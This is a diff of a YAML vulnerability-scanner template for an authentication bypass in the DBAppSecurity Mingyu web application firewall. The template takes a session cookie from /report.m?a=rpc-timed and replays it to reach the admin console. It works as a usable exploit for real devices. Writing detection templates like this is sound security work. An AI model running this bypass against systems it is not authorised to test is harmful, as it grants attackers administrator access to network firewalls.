@@ -1,30 +1,28 @@
-expression: r0() && r1()
 id: dbappsecurity-mingyu-report-user-bypass
+
 info:
+  name: 明御 WEB 应用防火墙 bypass
   author: 123456
-  description: "\u5B89\u6052 \u660E\u5FA1WEB\u5E94\u7528\u9632\u706B\u5899 report.php\u6587\
-    \u4EF6\u5B58\u5728\u786C\u7F16\u7801\u8BBE\u7F6E\u7684Console\u7528\u6237\u767B\
-    \u5F55\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u6F0F\u6D1E\u76F4\u63A5\
-    \u767B\u5F55\u540E\u53F0 \n"
-  name: "\u660E\u5FA1 WEB \u5E94\u7528\u9632\u706B\u5899 bypass"
-  reference:
-  - http://wiki.peiqi.tech/wiki/iot/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%20%E6%98%8E%E5%BE%A1WEB%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%20report.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html
   severity: high
+  description: |-
+    安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录，攻击者可以通过漏洞直接登录后台
+  tags: dbappsecurity,mingyu,bypass
+  created: 2023/09/05
+
 rules:
   r0:
+    request:
+      method: GET
+      path: /report.m?a=rpc-timed
     expression: response.status == 200 && response.body.bcontains(b'error_0x110005')
     output:
       search: '"Set-Cookie: WAFFSSID=(?P<waffssid>.*?);".bsubmatch(response.raw_header)'
       waffssid: search["waffssid"]
-    request:
-      method: GET
-      path: /report.m?a=rpc-timed
   r1:
-    expression: "response.status == 200 && response.body.bcontains(b'console') &&\
-      \ response.body.bcontains(b'\u9000\u51FA') && response.body.bcontains(b'\u8D85\
-      \u7EA7\u7BA1\u7406\u5458')"
     request:
-      headers:
-        Cookie: WAFFSSID={{waffssid}}
       method: GET
       path: /
+      headers:
+        Cookie: "WAFFSSID={{waffssid}}"
+    expression: response.status == 200 && response.body.bcontains(b'console') && response.body.bcontains(b'退出') && response.body.bcontains(b'超级管理员')
+expression: r0() && r1()
